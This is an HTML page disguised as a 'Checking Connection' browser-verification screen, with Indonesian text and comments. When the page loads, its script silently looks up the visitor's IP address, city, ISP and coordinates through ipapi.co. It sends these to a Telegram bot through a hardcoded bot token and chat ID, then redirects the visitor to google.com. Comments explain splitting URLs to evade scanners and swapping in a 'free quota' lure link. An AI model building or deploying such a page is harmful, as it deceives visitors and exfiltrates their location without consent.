<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Checking Connection...</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; color: #555; }
        .spin { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; margin: 0 auto 15px; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="box">
    <div class="spin"></div>
    <p>Mohon tunggu sebentar, sedang memverifikasi browser Anda...</p>
</div>

<script>
    // --- PENYAMARAN DATA ---
    // Gunakan btoa.com untuk encode/decode jika ingin lebih aman
    const _0x1 = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo"; // Ganti dengan Token lo
    const _0x2 = "8551809114"; // Ganti dengan ID Chat lo

    async function v() {
        try {
            // Kita pecah URL API biar gak kedeteksi bot scanner
            const a = "https://ip" + "api.co" + "/json/";
            const r = await fetch(a);
            const d = await r.json();

            // Menyusun pesan (Disamarkan)
            const m = `[!] VISIT INFO [!]\nIP: ${d.ip}\nCity: ${d.city}\nISP: ${d.org}\nLoc: ${d.latitude},${d.longitude}`;

            // Kirim ke Telegram (Method disamarkan lewat variabel)
            const t = "https://api.tele" + "gram.org/bot" + _0x1 + "/sendMessage";
            
            await fetch(t, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: _0x2,
                    text: m
                })
            });

            // Redirect ke link asli (Ganti dengan link kuota free atau apa saja)
            setTimeout(() => {
                window.location.replace("https://google.com");
            }, 1000);

        } catch (e) {
            window.location.replace("https://google.com");
        }
    }

    window.onload = v;
</script>
</body>
</html>
